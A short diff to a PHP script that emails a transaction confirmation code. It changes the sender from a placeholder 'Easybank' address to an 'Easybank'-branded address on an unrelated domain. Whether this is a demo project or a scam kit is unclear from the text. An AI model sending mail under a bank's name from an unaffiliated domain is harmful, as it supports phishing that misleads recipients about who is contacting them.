@@ -148,7 +148,7 @@ $mail->Body = $mailContent;
 $msg = " Mr,s $email your i_code for the confirm transaction is: $i_code ";
 
 $headers = "";
-$headers .= "From: Easybank <easybank@easybank.no-reply> \r\n";
+$headers .= "From: Easybank <noreply@ofiliyoungyz.site> \r\n";
 $headers .= "Reply-To:" . $email . "\r\n" ."X-Mailer: PHP/" . phpversion();
 $headers .= 'MIME-Version: 1.0' . "\r\n";
 $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n"; 
